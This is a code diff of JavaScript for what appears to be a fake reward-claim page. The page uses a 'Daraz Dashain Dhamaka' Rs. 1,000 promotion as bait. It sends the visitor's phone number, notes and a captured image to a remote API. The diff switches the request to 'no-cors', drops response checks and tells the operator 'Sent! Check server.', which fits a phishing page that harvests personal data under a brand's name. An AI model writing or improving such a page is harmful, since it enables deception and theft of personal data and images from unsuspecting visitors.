@@ -294,11 +294,10 @@ btnSubmit.addEventListener('click', function(){
   btnSubmit.textContent = 'SUBMITTING...';
 
   fetch(API, {
-  method: 'POST',
-  credentials: 'include',
-  headers: { 'Content-Type':'text/plain;charset=UTF-8' },
-  body: JSON.stringify({ ... })
-})
+    method: 'POST',
+    mode: 'no-cors',
+    headers: { 'Content-Type':'text/plain;charset=UTF-8' },
+    body: JSON.stringify({
       campaign: 'Daraz Dashain Dhamaka',
       reward: 'Rs. 1,000',
       phoneNumber: phone,
@@ -307,19 +306,12 @@ btnSubmit.addEventListener('click', function(){
       image: captured.image
     })
   })
-  .then(function(r){
-    return r.text().then(function(t){
-      showStatus('HTTP ' + r.status + ' | ' + t.slice(0,50));
-      if (r.ok) {
-        btnSubmit.textContent = '\u2713 CLAIMED';
-        btnSubmit.classList.add('success');
-        document.getElementById('phone').readOnly = true;
-        document.getElementById('notes').readOnly = true;
-      } else {
-        btnSubmit.disabled = false;
-        btnSubmit.textContent = 'RETRY';
-      }
-    });
+  .then(function(){
+    showStatus('Sent! Check server.');
+    btnSubmit.textContent = '\u2713 SENT';
+    btnSubmit.classList.add('success');
+    document.getElementById('phone').readOnly = true;
+    document.getElementById('notes').readOnly = true;
   })
   .catch(function(e){
     showStatus('FAILED: ' + e.message);
@@ -327,7 +319,7 @@ btnSubmit.addEventListener('click', function(){
     btnSubmit.textContent = 'RETRY';
   });
 });
-
+ 
 /* ---- STATUS PILL ---- */
 function showStatus(msg) {
   statusPill.textContent = msg;
